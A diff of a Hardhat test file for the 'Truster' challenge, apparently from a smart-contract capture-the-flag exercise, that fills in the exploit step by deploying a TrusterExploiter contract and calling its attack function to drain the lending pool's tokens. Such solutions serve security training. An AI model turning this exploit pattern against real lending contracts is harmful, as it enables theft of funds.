@@ -1,5 +1,9 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const {
+    ethers
+} = require('hardhat');
+const {
+    expect
+} = require('chai');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -29,6 +33,12 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        const TrusterExploiter = await ethers.getContractFactory("TrusterExploiter", attacker);
+        this.exploit = await TrusterExploiter.deploy(this.pool.address, this.token.address);
+        await this.exploit.connect(attacker).attack();
+        console.log("Updated pool balance is: ", await this.token.balanceOf(this.pool.address));
+
     });
 
     after(async function () {
@@ -43,4 +53,3 @@ describe('[Challenge] Truster', function () {
         ).to.equal('0');
     });
 });
-
